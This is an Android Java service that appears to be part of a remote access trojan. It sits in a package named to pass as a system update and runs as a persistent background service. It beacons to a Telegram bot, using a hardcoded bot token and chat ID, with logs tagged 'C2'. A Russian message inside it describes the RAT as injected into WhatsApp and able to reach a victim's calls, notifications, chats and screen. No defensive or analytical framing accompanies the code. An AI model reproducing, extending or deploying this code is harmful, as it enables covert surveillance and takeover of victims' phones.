package com.system.update;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class CoreService extends Service {
    private static final String BOT_TOKEN = "9149088713:AAHDnVftf8JvwlzSKtVhEcd5lioeyn7-cpI";
    private static final String CHAT_ID = "6717914771";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String text = "Приветствую, Босс.\nВы успешно написали скрипт RAT!\nПриложение в которое был вставлен код RAT: WhatsApp\nАдмин: @littsiq\nБот: Tuneeeeeeeell_bot\nСтатус: Активен\nОписание: Бот создан для удаленного управления устройством жертвы ( доступ к звонкам, уведомлениям, чатам и экрану). Бот лишь выполняет задачи написанные в скрипте (панель управления). За активацией бота писать @littsiq";
                    
                    String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setRequestProperty("Content-Type", "application/json");

                    String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + text.replace("\n", "\\n").replace("\"", "\\\"") + "\"}";
                    OutputStream os = conn.getOutputStream();
                    os.write(json.getBytes("UTF-8"));
                    os.close();

                    int responseCode = conn.getResponseCode();
                    Log.d("C2", "Telegram response: " + responseCode);
                } catch (Exception e) {
                    Log.e("C2", "Error sending", e);
                }
            }
        }).start();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
